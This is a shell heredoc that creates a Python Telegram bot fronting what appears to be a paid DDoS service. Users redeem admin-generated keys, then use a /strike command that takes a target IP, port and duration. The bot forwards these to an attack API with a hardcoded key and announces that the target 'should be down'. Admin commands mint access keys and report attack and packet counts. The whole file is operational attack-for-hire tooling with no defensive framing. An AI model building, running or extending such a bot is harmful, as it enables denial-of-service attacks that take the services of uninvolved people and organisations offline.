cat > bot.py << 'EOF'
import telebot
import json
import requests
import os
import threading
import time
from datetime import datetime

# Environment variables
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = os.environ.get('ADMIN_ID', '7837187893')
API_URL = os.environ.get('API_URL')
API_KEY = os.environ.get('API_KEY', 'BHAG_BHOSDIKE_2024')

if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set!")
    exit()

if not API_URL:
    print("⚠️ API_URL not set, using default")
    API_URL = "http://localhost:8080/api/strike"

bot = telebot.TeleBot(BOT_TOKEN)

USERS_DB = "users.json"
KEYS_DB = "keys.json"

def load(f):
    if os.path.exists(f):
        with open(f, 'r') as x:
            return json.load(x)
    return {}

def save(f, d):
    with open(f, 'w') as x:
        json.dump(d, x, indent=4)

def log(msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] {msg}")

@bot.message_handler(commands=['start'])
def start(m):
    log(f"Start from {m.from_user.id}")
    bot.reply_to(m, "🔥 **DANGER MODE ACTIVE**\n\nUse /help for commands")

@bot.message_handler(commands=['help'])
def help(m):
    txt = """
⚡ **DANGER COMMANDS**

/strike <IP> <PORT> <TIME> - Attack Target
/redeem <KEY> - Activate Plan  
/me - Check Your Plan
/status - System Status
/stats - Attack Statistics

👑 **ADMIN ONLY**
/gen <1h/1d/1w> - Generate Key
"""
    bot.reply_to(m, txt)

@bot.message_handler(commands=['gen'])
def gen(m):
    if str(m.from_user.id) != ADMIN_ID:
        return bot.reply_to(m, "❌ Admin Only!")
    
    args = m.text.split()
    if len(args) < 2:
        return bot.reply_to(m, "/gen 1h")
    
    key = "VIP-" + os.urandom(3).hex().upper()
    keys = load(KEYS_DB)
    keys[key] = args[1]
    save(KEYS_DB, keys)
    
    bot.reply_to(m, f"✅ **KEY GENERATED**\n🔑 `{key}`\n⏱️ {args[1]}")
    log(f"Admin generated key: {key}")

@bot.message_handler(commands=['redeem'])
def redeem(m):
    args = m.text.split()
    if len(args) < 2:
        return bot.reply_to(m, "/redeem VIP-XXXX")
    
    keys = load(KEYS_DB)
    if args[1] in keys:
        users = load(USERS_DB)
        users[str(m.from_user.id)] = {
            "plan": keys[args[1]],
            "active": True,
            "redeemed_at": str(datetime.now())
        }
        save(USERS_DB, users)
        del keys[args[1]]
        save(KEYS_DB, keys)
        
        bot.reply_to(m, f"✅ **ACTIVATED!**\nPlan: {keys[args[1]]}")
        log(f"User {m.from_user.id} redeemed key")
    else:
        bot.reply_to(m, "❌ Invalid or Expired Key!")

@bot.message_handler(commands=['me'])
def me(m):
    users = load(USERS_DB)
    uid = str(m.from_user.id)
    
    if uid in users and users[uid].get('active'):
        bot.reply_to(m, f"✅ **ACTIVE PLAN**\n📅 Plan: {users[uid]['plan']}\n🕐 Activated: {users[uid]['redeemed_at']}")
    else:
        bot.reply_to(m, "❌ No Active Plan!\nUse /redeem <KEY>")

@bot.message_handler(commands=['strike'])
def strike(m):
    users = load(USERS_DB)
    uid = str(m.from_user.id)
    
    if uid not in users or not users[uid].get('active'):
        return bot.reply_to(m, "❌ **NO ACTIVE PLAN!**\n/redeem <KEY>")
    
    args = m.text.split()
    if len(args) != 4:
        return bot.reply_to(m, "❌ **FORMAT**\n/strike <IP> <PORT> <TIME>")
    
    ip, port, sec = args[1], args[2], args[3]
    
    if not port.isdigit() or not sec.isdigit():
        return bot.reply_to(m, "❌ Port and Time must be numbers!")
    
    if int(sec) > 300:
        return bot.reply_to(m, "❌ Max time is 300 seconds!")
    
    log(f"Strike from {m.from_user.id}: {ip}:{port} for {sec}s")
    
    msg = bot.reply_to(m, f"🔥 **INITIATING STRIKE**\n🎯 Target: `{ip}:{port}`\n⏱️ Duration: {sec}s\n\n⚡ Sending attack command...")
    
    try:
        url = f"{API_URL}?key={API_KEY}&ip={ip}&port={port}&time={sec}"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            bot.edit_message_text(
                f"💥 **STRIKE LAUNCHED!**\n\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"⏱️ Duration: {sec}s\n"
                f"🔥 Mode: DANGER\n"
                f"📡 Status: ACTIVE\n\n"
                f"✅ Attack will finish in {sec} seconds",
                msg.chat.id, msg.message_id
            )
            
            def finish():
                bot.send_message(
                    m.chat.id,
                    f"✅ **STRIKE COMPLETE**\n🎯 `{ip}:{port}`\n⏱️ {sec}s\n\n🔥 Target should be down!"
                )
            
            threading.Timer(int(sec) + 2, finish).start()
        else:
            bot.edit_message_text(
                f"❌ **API ERROR**\nStatus: {response.status_code}\nResponse: {response.text[:100]}",
                msg.chat.id, msg.message_id
            )
    except Exception as e:
        bot.edit_message_text(
            f"❌ **CONNECTION FAILED**\n{str(e)[:150]}\n\nCheck if API is running!",
            msg.chat.id, msg.message_id
        )
        log(f"Error: {str(e)}")

@bot.message_handler(commands=['status'])
def status(m):
    try:
        health_url = API_URL.replace('/api/strike', '/api/health')
        r = requests.get(health_url, timeout=5)
        
        if r.status_code == 200:
            data = r.json()
            api_status = f"✅ ONLINE\n🔥 Mode: {data.get('mode', 'DANGER')}\n📊 Attacks: {data.get('attacks', 0)}"
        else:
            api_status = f"❌ OFFLINE (Status: {r.status_code})"
    except Exception as e:
        api_status = f"❌ OFFLINE\nError: {str(e)[:50]}"
    
    bot.reply_to(m, f"🤖 **BOT STATUS**\n✅ Bot: Active\n🔌 API: {api_status}\n💻 Platform: Render\n\n🔥 DANGER MODE READY")

@bot.message_handler(commands=['stats'])
def stats(m):
    if str(m.from_user.id) != ADMIN_ID:
        return bot.reply_to(m, "❌ Admin Only!")
    
    try:
        stats_url = API_URL.replace('/api/strike', '/api/stats')
        r = requests.get(f"{stats_url}?key={API_KEY}", timeout=5)
        
        if r.status_code == 200:
            data = r.json()
            bot.reply_to(m, f"📊 **ATTACK STATISTICS**\n"
                         f"🔥 Total Attacks: {data.get('total_attacks', 0)}\n"
                         f"💥 Total Packets: {data.get('total_packets', 0):,}\n"
                         f"📡 Status: {data.get('status', 'active')}")
        else:
            bot.reply_to(m, "❌ Cannot fetch stats")
    except:
        bot.reply_to(m, "❌ API Unreachable")

print("\n" + "="*50)
print("🔥 DANGER BOT STARTING!")
print(f"🤖 Bot Token: {'✅' if BOT_TOKEN else '❌'}")
print(f"📍 API URL: {API_URL}")
print(f"👑 Admin ID: {ADMIN_ID}")
print("="*50 + "\n")

log("Bot initialized")
bot.polling(none_stop=True)
EOF
